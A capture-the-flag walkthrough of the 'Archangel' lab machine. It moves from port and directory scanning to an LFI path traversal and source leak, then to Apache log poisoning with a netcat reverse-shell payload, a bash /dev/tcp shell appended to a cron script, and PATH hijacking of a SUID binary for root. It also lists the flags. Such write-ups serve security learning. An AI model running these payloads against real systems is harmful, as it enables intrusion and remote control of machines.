> Archangel

**export IP=10.10.150.53**

# Nmap

nmap -sC -sV -T4 -Pn -p- -vv -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/test.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

# Nikto

nikto -h http://$IP

```
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3092: /pages/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
```

# Gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial -x php,sql,txt,js,bak,tar,bin,cgi

```
/images (Status: 301)
/pages (Status: 301)
/flags (Status: 301)
/layout (Status: 301)
/licence.txt (Status: 200)
```

We got nothing ,much interesting. Let's look at the flags folder.Couldn't get anything. Looking at the home page we got `support@mafialive.thm`. Let's put mafialive.thm in our /etc/hosts file. And when moving to mafialive.thm we got the 1st flag!

# Flag 1

```
thm{f0und_th3_r1ght_h0st_n4m3}
```

## robots.txt

```
Disallow: /test.php
```

And accessing test.php when we click the button we are redirected to `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`. Looks like we have LFI. By trying many ways we got one hit `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd
` at my first try.

We can also try `curl 'http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php' | base64 -d` And looking at test.php we got the 2nd flag!

# Flag 2

```
thm{explo1t1ng_lf1}
```

# Log-Poisoning

curl 'http://10.10.150.53.thm/test.php?view=php://filter/resource=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log'

We can poison the log using User-Agent!

curl 'http://mXXXXXXXe.thm/tXXX.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log' -H "User-Agent: asd <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.2.82 1337 >/tmp/f'); ?> fgh"

And now we got a shell!!

# User.txt

```
thm{lf1_t0_rc3_1s_tr1cky}
```

find / -perm -u=s -type f 2>/dev/null

```
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping
```

# Crontab

`*/1 *   * * *   archangel /opt/helloworld.sh`

And putiing an one-liner there we are in as archangel!

echo "bash -i >& /dev/tcp/10.8.107.21/1234 0>&1" >> /opt/helloworld.sh

# User2.txt

```
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
```

We can find a ELF file backup. And we can find `cp /home/user/archangel/myfiles/* /opt/backupfiles
` this while using strings. And when we use this command we get an error `cannot stat /home/user/archangel/myfiles/*: No such dir`. Here they have used absolut path for cp, which is it search for cp in each directory. So let's try to abuse this.

## Exploit

```
$ cd /dev/shm
$ mkdir random123
$ cd random123
$ echo 'bash -p' > cp
$ chmod +x ./cp
$ export PATH="/dev/shm/random123/:$PATH"
$ /home/archangel/secret/backup
```

And we are root!!

# root.txt

```
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}	
```